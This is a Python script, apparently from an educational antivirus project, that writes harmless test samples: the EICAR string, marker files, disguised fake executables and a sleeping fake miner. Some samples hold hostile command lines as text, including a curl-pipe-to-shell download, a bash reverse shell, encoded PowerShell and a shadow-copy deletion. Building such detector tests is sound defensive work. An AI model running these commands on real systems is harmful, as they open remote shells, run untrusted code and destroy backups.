"""Crée des échantillons de TEST INOFFENSIFS : ce sont de simples fichiers texte contenant des marqueurs.
Aucun code malveillant n'est présent. Le fichier EICAR est le standard de test des antivirus (inoffensif)."""
import os, random
from pathlib import Path

EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

def make(folder):
    d = Path(folder); d.mkdir(parents=True, exist_ok=True)
    (d / "eicar_test.com").write_text(EICAR)
    (d / "trojan_dropper_sim.txt").write_text("fichier de test\nMINIAV-TEST-TROJAN-DROPPER\nne fait rien\n")
    (d / "RANSOM_NOTE_sim.txt").write_text("MINIAV-TEST-RANSOM-NOTE\nYour files have been encrypted (SIMULATION)\n")
    (d / "worm_sim.txt").write_text("# MINIAV-TEST-WORM-SPREADER (simulation)\n")
    # heuristique : script avec plusieurs chaînes suspectes (texte seulement, jamais exécuté)
    (d / "script_suspect.ps1").write_text("# SIMULATION : texte uniquement\npowershell -enc SQBFAFgA\nvssadmin delete shadows /all\n")
    (d / "droper.sh").write_text("# SIMULATION\ncurl http://exemple.invalid/x.sh | sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    # double extension + binaire déguisé
    (d / "facture.pdf.exe").write_bytes(b"MZ" + b"\x00" * 64)
    (d / "photo.jpg").write_bytes(b"MZ" + b"\x00" * 64)
    # fichiers sains
    (d / "notes.txt").write_text("Cours de cybersécurité : chapitre 1\n")
    (d / "rapport.csv").write_text("id,valeur\n1,10\n2,20\n")
    (d / "image_ok.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(random.Random(1).randrange(256) for _ in range(5000)))
    (d / "script_ok.py").write_text("print('Bonjour')\n")
    return d

def make_fake_malware_script(folder):
    """Script de test : une boucle qui dort + le marqueur de signature. Il sert à tester l'arrêt de processus."""
    p = Path(folder) / "fake_miner.py"
    p.write_text('# MINIAV-TEST-MINER-9F3A  (simulation : ne fait que dormir)\nimport time\nwhile True:\n    time.sleep(1)\n')
    return p

if __name__ == "__main__":
    print("créé :", make("samples"))
